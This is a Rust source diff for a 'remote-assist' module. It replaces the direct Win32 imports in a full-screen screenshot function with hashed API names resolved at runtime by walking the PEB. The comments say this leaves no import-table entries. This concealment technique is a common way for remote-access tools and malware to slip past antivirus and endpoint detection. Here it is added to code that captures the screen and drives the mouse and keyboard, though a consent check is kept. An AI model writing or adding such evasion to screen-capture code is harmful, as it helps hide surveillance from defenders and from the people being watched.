@@ -10,6 +10,7 @@
 #![cfg(feature = "remote-assist")]
 
 use anyhow::{anyhow, Result};
+use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 #[cfg(any(target_os = "linux", windows, target_os = "macos"))]
 use enigo::{Coordinate, Direction, Enigo, Keyboard, Mouse, Settings};
 #[cfg(any(target_os = "linux", windows, target_os = "macos"))]
@@ -355,6 +356,98 @@ fn consent_path() -> Option<std::path::PathBuf> {
     Some(std::path::PathBuf::from("/tmp/orchestra-consent"))
 }
 
+// ── pe_resolve helpers ──────────────────────────────────────────────────────
+
+/// Resolve a function pointer from a DLL that is already loaded in the PEB.
+#[cfg(windows)]
+unsafe fn resolve_api<T>(dll_hash: u32, fn_hash: u32) -> Result<T> {
+    let module = pe_resolve::get_module_handle_by_hash(dll_hash)
+        .ok_or_else(|| anyhow!("DLL not found (hash 0x{:08X})", dll_hash))?;
+    let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
+        .ok_or_else(|| anyhow!("API not found (hash 0x{:08X})", fn_hash))?;
+    Ok(std::mem::transmute_copy(&addr))
+}
+
+/// Resolve a function pointer from a DLL, loading it if not already present.
+#[cfg(windows)]
+unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) -> Result<T> {
+    let module = match pe_resolve::get_module_handle_by_hash(dll_hash) {
+        Some(m) => m,
+        None => {
+            let load_library_w: unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void =
+                resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"LoadLibraryW\0"))?;
+            let m = load_library_w(dll_wide.as_ptr());
+            if m.is_null() {
+                return Err(anyhow!("LoadLibraryW failed for DLL (hash 0x{:08X})", dll_hash));
+            }
+            m
+        }
+    };
+    let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
+        .ok_or_else(|| anyhow!("API not found (hash 0x{:08X})", fn_hash))?;
+    Ok(std::mem::transmute_copy(&addr))
+}
+
+// ── user32.dll wide string & hash ────────────────────────────────────────────
+#[cfg(windows)]
+const USER32_DLL_W: &[u16] = &['u' as u16, 's' as u16, 'e' as u16, 'r' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+#[cfg(windows)]
+const HASH_USER32_DLL: u32 = hash_wstr_const(USER32_DLL_W);
+
+// ── gdi32.dll wide string & hash ─────────────────────────────────────────────
+#[cfg(windows)]
+const GDI32_DLL_W: &[u16] = &['g' as u16, 'd' as u16, 'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+#[cfg(windows)]
+const HASH_GDI32_DLL: u32 = hash_wstr_const(GDI32_DLL_W);
+
+// ── API hash constants (user32) ──────────────────────────────────────────────
+#[cfg(windows)]
+const HASH_GETDC: u32            = hash_str_const(b"GetDC\0");
+#[cfg(windows)]
+const HASH_RELEASEDC: u32        = hash_str_const(b"ReleaseDC\0");
+#[cfg(windows)]
+const HASH_GETSYSTEMMETRICS: u32 = hash_str_const(b"GetSystemMetrics\0");
+
+// ── API hash constants (gdi32) ───────────────────────────────────────────────
+#[cfg(windows)]
+const HASH_BITBLT: u32                = hash_str_const(b"BitBlt\0");
+#[cfg(windows)]
+const HASH_CREATECOMPATIBLEBITMAP: u32 = hash_str_const(b"CreateCompatibleBitmap\0");
+#[cfg(windows)]
+const HASH_CREATECOMPATIBLEDC: u32    = hash_str_const(b"CreateCompatibleDC\0");
+#[cfg(windows)]
+const HASH_DELETEDC: u32             = hash_str_const(b"DeleteDC\0");
+#[cfg(windows)]
+const HASH_DELETEOBJECT: u32          = hash_str_const(b"DeleteObject\0");
+#[cfg(windows)]
+const HASH_GETDIBITS: u32            = hash_str_const(b"GetDIBits\0");
+#[cfg(windows)]
+const HASH_SELECTOBJECT: u32          = hash_str_const(b"SelectObject\0");
+
+// ── Function pointer types (user32) ──────────────────────────────────────────
+#[cfg(windows)]
+type FnGetDC          = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
+#[cfg(windows)]
+type FnReleaseDC      = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void) -> i32;
+#[cfg(windows)]
+type FnGetSystemMetrics = unsafe extern "system" fn(i32) -> i32;
+
+// ── Function pointer types (gdi32) ───────────────────────────────────────────
+#[cfg(windows)]
+type FnBitBlt                = unsafe extern "system" fn(*mut std::ffi::c_void, i32, i32, i32, i32, *mut std::ffi::c_void, i32, i32, u32) -> i32;
+#[cfg(windows)]
+type FnCreateCompatibleBitmap = unsafe extern "system" fn(*mut std::ffi::c_void, i32, i32) -> *mut std::ffi::c_void;
+#[cfg(windows)]
+type FnCreateCompatibleDC    = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
+#[cfg(windows)]
+type FnDeleteDC              = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+#[cfg(windows)]
+type FnDeleteObject          = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+#[cfg(windows)]
+type FnGetDIBits             = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, u32, u32, *mut std::ffi::c_void, *mut winapi::um::wingdi::BITMAPINFO, u32) -> i32;
+#[cfg(windows)]
+type FnSelectObject          = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void) -> *mut std::ffi::c_void;
+
 #[cfg(not(windows))]
 fn check_consent() -> Result<()> {
     match consent_path() {
@@ -423,18 +516,38 @@ pub fn take_screenshot() -> Result<Vec<u8>> {
     {
         check_consent()?;
         use std::io::Cursor;
-        use winapi::shared::windef::HBITMAP;
-        use winapi::um::wingdi::{
-            BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject, GetDIBits,
-            SelectObject, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY,
-        };
-        use winapi::um::winuser::{GetDC, GetSystemMetrics, ReleaseDC, SM_CXSCREEN, SM_CYSCREEN};
+        use winapi::um::wingdi::{BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY};
+        use winapi::um::winuser::{SM_CXSCREEN, SM_CYSCREEN};
 
         // SAFETY: All Win32 handles are checked for null before use and are
         // released in reverse-acquisition order even on early returns.
         let png_bytes = unsafe {
-            let width = GetSystemMetrics(SM_CXSCREEN);
-            let height = GetSystemMetrics(SM_CYSCREEN);
+            // Resolve user32 functions at runtime (no IAT entries).
+            let get_system_metrics: FnGetSystemMetrics =
+                resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETSYSTEMMETRICS)?;
+            let get_dc: FnGetDC =
+                resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETDC)?;
+            let release_dc: FnReleaseDC =
+                resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_RELEASEDC)?;
+
+            // Resolve gdi32 functions at runtime (no IAT entries).
+            let create_compatible_dc: FnCreateCompatibleDC =
+                resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_CREATECOMPATIBLEDC)?;
+            let create_compatible_bitmap: FnCreateCompatibleBitmap =
+                resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_CREATECOMPATIBLEBITMAP)?;
+            let select_object: FnSelectObject =
+                resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_SELECTOBJECT)?;
+            let bit_blt: FnBitBlt =
+                resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_BITBLT)?;
+            let get_di_bits: FnGetDIBits =
+                resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_GETDIBITS)?;
+            let delete_object: FnDeleteObject =
+                resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_DELETEOBJECT)?;
+            let delete_dc: FnDeleteDC =
+                resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_DELETEDC)?;
+
+            let width = get_system_metrics(SM_CXSCREEN);
+            let height = get_system_metrics(SM_CYSCREEN);
             if width <= 0 || height <= 0 {
                 return Err(anyhow!(
                     "GetSystemMetrics returned invalid screen dimensions: {}x{}",
@@ -443,32 +556,32 @@ pub fn take_screenshot() -> Result<Vec<u8>> {
                 ));
             }
 
-            let hdc_screen = GetDC(std::ptr::null_mut());
+            let hdc_screen = get_dc(std::ptr::null_mut());
             if hdc_screen.is_null() {
                 return Err(anyhow!("GetDC failed — no desktop DC available"));
             }
 
-            let hdc_mem = CreateCompatibleDC(hdc_screen);
+            let hdc_mem = create_compatible_dc(hdc_screen);
             if hdc_mem.is_null() {
-                ReleaseDC(std::ptr::null_mut(), hdc_screen);
+                release_dc(std::ptr::null_mut(), hdc_screen);
                 return Err(anyhow!("CreateCompatibleDC failed"));
             }
 
-            let hbm: HBITMAP = CreateCompatibleBitmap(hdc_screen, width, height);
+            let hbm: *mut std::ffi::c_void = create_compatible_bitmap(hdc_screen, width, height);
             if hbm.is_null() {
-                DeleteDC(hdc_mem);
-                ReleaseDC(std::ptr::null_mut(), hdc_screen);
+                delete_dc(hdc_mem);
+                release_dc(std::ptr::null_mut(), hdc_screen);
                 return Err(anyhow!("CreateCompatibleBitmap failed"));
             }
 
-            let old_obj = SelectObject(hdc_mem, hbm as _);
-            let blt_ok = BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY);
+            let old_obj = select_object(hdc_mem, hbm);
+            let blt_ok = bit_blt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY);
 
             if blt_ok == 0 {
-                SelectObject(hdc_mem, old_obj);
-                DeleteObject(hbm as _);
-                DeleteDC(hdc_mem);
-                ReleaseDC(std::ptr::null_mut(), hdc_screen);
+                select_object(hdc_mem, old_obj);
+                delete_object(hbm);
+                delete_dc(hdc_mem);
+                release_dc(std::ptr::null_mut(), hdc_screen);
                 return Err(anyhow!("BitBlt failed — screen capture blocked"));
             }
 
@@ -495,7 +608,7 @@ pub fn take_screenshot() -> Result<Vec<u8>> {
             // Each pixel is 4 bytes (BGRA).
             let mut pixels: Vec<u8> = vec![0u8; pixel_count * 4];
 
-            let scan_lines = GetDIBits(
+            let scan_lines = get_di_bits(
                 hdc_mem,
                 hbm,
                 0,
@@ -505,10 +618,10 @@ pub fn take_screenshot() -> Result<Vec<u8>> {
                 DIB_RGB_COLORS,
             );
 
-            SelectObject(hdc_mem, old_obj);
-            DeleteObject(hbm as _);
-            DeleteDC(hdc_mem);
-            ReleaseDC(std::ptr::null_mut(), hdc_screen);
+            select_object(hdc_mem, old_obj);
+            delete_object(hbm);
+            delete_dc(hdc_mem);
+            release_dc(std::ptr::null_mut(), hdc_screen);
 
             if scan_lines == 0 {
                 return Err(anyhow!("GetDIBits failed — could not read screen pixels"));
